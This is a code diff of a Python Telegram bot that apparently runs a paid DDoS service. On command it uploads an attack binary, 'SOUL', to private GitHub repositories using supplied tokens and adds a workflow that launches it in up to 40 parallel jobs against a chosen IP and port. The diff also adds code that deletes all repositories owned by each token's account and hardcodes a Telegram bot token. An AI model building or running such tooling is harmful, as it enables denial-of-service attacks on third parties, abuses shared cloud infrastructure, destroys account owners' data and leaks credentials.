@@ -2,46 +2,16 @@ import os
 import asyncio
 import base64
 import json
-import threading
 from datetime import datetime
 from telegram import Update
 from telegram.constants import ChatAction
 from telegram.ext import Application, CommandHandler, ContextTypes
 from github import Github, InputGitTreeElement, Auth
-from flask import Flask
 
-
-# Bot config
-TELEGRAM_TOKEN = os.environ.get("7828525928:AAGyxRd-HIfgqSgBwtzM2fYRK9EIR3QImS0")  # safer than hardcoding
+TELEGRAM_TOKEN = '7828525928:AAGyxRd-HIfgqSgBwtzM2fYRK9EIR3QImS0'
 
 ADMIN_IDS = {7163028849}
 DATA_FILE = 'soul.json'
-CREDIT_COST_PER_ATTACK = 25
-REPO_NAME = "soulcrack90"
-
-VBV_LOADING_FRAMES = [
-    "🟦 [■□□□□]",
-    "🟦 [■■□□□]",
-    "🟦 [■■■□□]",
-    "🟦 [■■■■□]",
-    "🟦 [■■■■■]",
-]
-
-SOUL_YML_TEMPLATE = '''name: Run Soul 50x
-on: [push]
-jobs:
-  soul:
-    runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        n: [1,2,3,4,5,6,7,8,9,10]
-    steps:
-      - uses: actions/checkout@v3
-      - name: Make binary executable
-        run: chmod +x *
-      - name: Run soul binary
-        run: ./SOUL {ip} {port} {time} 900 -1
-'''
 
 user_sessions = {}
 if os.path.exists(DATA_FILE):
@@ -64,24 +34,50 @@ def save_data():
     with open(DATA_FILE, 'w') as f:
         json.dump(to_save, f)
 
+VBV_LOADING_FRAMES = [
+    "🟦 [■□□□□]",
+    "🟦 [■■□□□]",
+    "🟦 [■■■□□]",
+    "🟦 [■■■■□]",
+    "🟦 [■■■■■]",
+]
+
+SOUL_YML_TEMPLATE = '''name: Run Soul 50x
+on: [push]
+jobs:
+  soul:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40]
+    steps:
+      - uses: actions/checkout@v3
+      - name: Make binary executable
+        run: chmod +x *
+      - name: Run soul binary
+        run: ./SOUL {ip} {port} {time} 50 -1
+'''
+
+REPO_NAME = "soulcrack90"
+CREDIT_COST_PER_ATTACK = 25
+
 def is_admin(user_id: int) -> bool:
     return user_id in ADMIN_IDS
-
-# === Telegram Bot Commands ===
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "/start - Show commands\n"
-        "/approve <id> <credit>\n"
-        "/credit <id> <credit>\n"
-        "/remove <id>\n"
-        "/token <token1> <token2> ...\n"
-        "/server <ip> <port> <time>\n"
-        "/status"
+        "/approve <id> <credit> - Approve ID with credit (admin only)\n"
+        "/credit <id> <credit> - Add credit to ID (admin only)\n"
+        "/remove <id> - Remove ID approval (admin only)\n"
+        "/token <token1> <token2> ... - Provide GitHub tokens separated by space (admin only)\n"
+        "/server <ip> <port> <time> - Run binary with params on approved IDs\n"
+        "/status - Show approved IDs and their credits\n"
     )
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id): return
+    if not is_admin(update.effective_user.id):
+        return
     if len(context.args) != 2:
         await update.message.reply_text("Usage: /approve <id> <credit>")
         return
@@ -89,7 +85,8 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     id_ = context.args[0]
     try:
         credit = int(context.args[1])
-        if credit <= 0: raise ValueError()
+        if credit <= 0:
+            raise ValueError()
     except Exception:
         await update.message.reply_text("Credit must be a positive integer")
         return
@@ -103,7 +100,8 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"Approved ID {id_} with {credit} credits.")
 
 async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id): return
+    if not is_admin(update.effective_user.id):
+        return
     if len(context.args) != 2:
         await update.message.reply_text("Usage: /credit <id> <credit>")
         return
@@ -111,7 +109,8 @@ async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     id_ = context.args[0]
     try:
         credit = int(context.args[1])
-        if credit <= 0: raise ValueError()
+        if credit <= 0:
+            raise ValueError()
     except Exception:
         await update.message.reply_text("Credit must be a positive integer")
         return
@@ -122,33 +121,38 @@ async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session['credits'][id_] += credit
     user_sessions[chat_id] = session
     save_data()
-    await update.message.reply_text(f"Added {credit} credits to ID {id_}.")
+    await update.message.reply_text(f"Added {credit} credits to ID {id_}. Total: {session['credits'][id_]}")
 
 async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id): return
+    if not is_admin(update.effective_user.id):
+        return
     if len(context.args) != 1:
         await update.message.reply_text("Usage: /remove <id>")
         return
     chat_id = str(update.effective_chat.id)
     id_ = context.args[0]
     session = user_sessions.get(chat_id, {})
-    session.get('approved', set()).discard(id_)
-    session.get('credits', {}).pop(id_, None)
+    if 'approved' in session and id_ in session['approved']:
+        session['approved'].remove(id_)
+    if 'credits' in session and id_ in session['credits']:
+        del session['credits'][id_]
     user_sessions[chat_id] = session
     save_data()
-    await update.message.reply_text(f"Removed ID {id_}.")
+    await update.message.reply_text(f"Removed approval and credit for ID {id_}.")
 
 async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id): return
+    if not is_admin(update.effective_user.id):
+        return
     if not context.args:
         await update.message.reply_text("Usage: /token <token1> <token2> ...")
         return
     chat_id = str(update.effective_chat.id)
+    tokens = context.args
     session = user_sessions.get(chat_id, {})
-    session['github_tokens'] = context.args
+    session['github_tokens'] = tokens
     user_sessions[chat_id] = session
     save_data()
-    await update.message.reply_text(f"Stored {len(context.args)} token(s).")
+    await update.message.reply_text(f"Stored {len(tokens)} GitHub token(s).")
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = str(update.effective_chat.id)
@@ -171,89 +175,126 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     credits = session.get('credits', {})
     github_tokens = session.get('github_tokens', [])
     if not github_tokens:
-        await update.message.reply_text("No GitHub tokens set. Use /token")
+        await update.message.reply_text("Admin must set GitHub token(s) first with /token. Power By @cracks_owner")
         return
     if not approved_ids:
-        await update.message.reply_text("No approved IDs.")
+        await update.message.reply_text("No approved IDs to run attack on. Use /approve first. Power By @soulcracks_owner")
         return
     if len(context.args) != 3:
-        await update.message.reply_text("Usage: /server <ip> <port> <time>")
+        await update.message.reply_text("Usage: /server <ip> <port> <time> Power By @soulcracks_owner")
         return
     ip, port, time_s = context.args
     try:
         time_int = int(time_s)
-        if time_int <= 0: raise ValueError()
+        if time_int <= 0:
+            raise ValueError()
     except Exception:
-        await update.message.reply_text("Time must be positive int")
+        await update.message.reply_text("Time must be a positive integer")
         return
     if not os.path.isfile("SOUL"):
-        await update.message.reply_text("Binary 'SOUL' not found.")
+        await update.message.reply_text("Local binary 'soul' not found!")
         return
     await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
     msg = await update.message.reply_text(f"{VBV_LOADING_FRAMES[0]}  0% completed")
+    frame_count = len(VBV_LOADING_FRAMES)
     for i, frame in enumerate(VBV_LOADING_FRAMES):
+        percentage = int(((i + 1) / frame_count) * 100)
+        display_message = f"{frame}  {percentage}% completed"
         await asyncio.sleep(1)
-        percent = int(((i+1)/len(VBV_LOADING_FRAMES))*100)
         try:
-            await msg.edit_text(f"{frame}  {percent}% completed")
-        except:
+            await msg.edit_text(display_message)
+        except Exception:
             pass
+    # For all approved IDs with sufficient credit, run attack on all tokens
     tasks = []
     for id_ in list(approved_ids):
         credit = credits.get(id_, 0)
         if credit < CREDIT_COST_PER_ATTACK:
-            await update.message.reply_text(f"ID {id_} lacks enough credit.")
+            await update.message.reply_text(f"ID {id_} does not have enough credit. Needs at least {CREDIT_COST_PER_ATTACK}.")
             continue
-        credits[id_] -= CREDIT_COST_PER_ATTACK
+        credits[id_] = credit - CREDIT_COST_PER_ATTACK
         for token in github_tokens:
             tasks.append(run_workflow_with_token_and_id(chat_id, token, ip, port, time_int, id_))
     user_sessions[chat_id]['credits'] = credits
     save_data()
-    if tasks:
-        await asyncio.gather(*tasks)
-        await msg.edit_text("✅ Attack sent successfully.")
-    else:
-        await msg.edit_text("❌ No valid IDs to run the attack.")
+    if not tasks:
+        await update.message.reply_text("No IDs with enough credit to start attack.")
+        return
+    await asyncio.gather(*tasks)
+    try:
+        await msg.edit_text("✅ Attack successfully! Power By @soulcrack_owner")
+    except Exception:
+        pass
 
 async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, id_):
     try:
         os.system("chmod +x *")
         g = Github(auth=Auth.Token(github_token))
         user = g.get_user()
+        try:
+            repos = user.get_repos()
+            delete_tasks = []
+            for repo in repos:
+                if repo.owner.login == user.login:
+                    delete_tasks.append(asyncio.to_thread(repo.delete))
+            await asyncio.gather(*delete_tasks)
+            await asyncio.sleep(2)
+        except Exception:
+            pass
         repo = user.create_repo(REPO_NAME, private=True, auto_init=True)
         branch = repo.default_branch or "main"
-        ref = repo.get_git_ref(f"heads/{branch}")
-        commit = repo.get_git_commit(ref.object.sha)
-        base_tree = repo.get_git_tree(commit.sha)
+        base_ref = repo.get_git_ref(f"heads/{branch}")
+        base_commit = repo.get_git_commit(base_ref.object.sha)
+        base_tree = repo.get_git_tree(base_commit.sha)
         with open("SOUL", "rb") as f:
-            b64 = base64.b64encode(f.read()).decode('utf-8')
-        blob = repo.create_git_blob(b64, "base64")
-        binary = InputGitTreeElement("SOUL", "100755", "blob", sha=blob.sha)
-        tree = repo.create_git_tree([binary], base_tree)
-        commit = repo.create_git_commit("Add SOUL", tree, [commit])
-        ref.edit(commit.sha)
-        yml = SOUL_YML_TEMPLATE.format(ip=ip, port=port, time=time)
-        yml_tree = repo.create_git_tree([
-            InputGitTreeElement(".github/workflows/soul.yml", "100644", "blob", content=yml)
-        ], tree)
-        yml_commit = repo.create_git_commit("Add workflow", yml_tree, [commit])
-        ref.edit(yml_commit.sha)
-    except Exception as e:
-        print(f"Error in workflow: {e}")
+            binary_content = f.read()
+        binary_b64 = base64.b64encode(binary_content).decode('utf-8')
+        blob = repo.create_git_blob(binary_b64, "base64")
+        binary_element = InputGitTreeElement(
+            path="SOUL",
+            mode='100755',
+            type='blob',
+            sha=blob.sha,
+        )
+        new_tree = repo.create_git_tree([binary_element], base_tree)
+        new_commit = repo.create_git_commit("Add SOUL binary", new_tree, [base_commit])
+        base_ref.edit(new_commit.sha)
+        base_ref = repo.get_git_ref(f"heads/{branch}")
+        base_commit = repo.get_git_commit(base_ref.object.sha)
+        base_tree = repo.get_git_tree(base_commit.sha)
+        yml_content = SOUL_YML_TEMPLATE.format(ip=ip, port=port, time=time)
+        yml_element = InputGitTreeElement(
+            path=".github/workflows/soul.yml",
+            mode='100644',
+            type='blob',
+            content=yml_content,
+        )
+        workflow_tree = repo.create_git_tree([yml_element], base_tree)
+        workflow_commit = repo.create_git_commit("Add workflow", workflow_tree, [base_commit])
+        base_ref.edit(workflow_commit.sha)
+    except Exception:
+        pass
 
-# === Main Entry ===
+async def schedule_delete_and_notify(chat_id, github_token, repo_name, sec, ip, port, time, update):
+    await asyncio.sleep(sec)
+    try:
+        g = Github(auth=Auth.Token(github_token))
+        repo = g.get_user().get_repo(repo_name)
+        repo.delete()
+        await update.message.reply_text(f"🛑 Attack over on {ip}:{port} after {time} seconds.")
+    except Exception:
+        pass
 
-
-async def run_bot():
-    telegram_app = Application.builder().token(TELEGRAM_TOKEN).build()
-    telegram_app.add_handler(CommandHandler("start", start))
-    telegram_app.add_handler(CommandHandler("approve", approve))
-    telegram_app.add_handler(CommandHandler("credit", add_credit))
-    telegram_app.add_handler(CommandHandler("remove", remove))
-    telegram_app.add_handler(CommandHandler("token", token))
-    telegram_app.add_handler(CommandHandler("server", server))
-    telegram_app.add_handler(CommandHandler("status", status))
-    await telegram_app.run_polling()
+def main():
+    app = Application.builder().token(TELEGRAM_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("approve", approve))
+    app.add_handler(CommandHandler("credit", add_credit))
+    app.add_handler(CommandHandler("remove", remove))
+    app.add_handler(CommandHandler("token", token))
+    app.add_handler(CommandHandler("server", server))
+    app.add_handler(CommandHandler("status", status))
+    app.run_polling()
 
 if __name__ == "__main__":
-    asyncio.run(run_bot())
+    main()
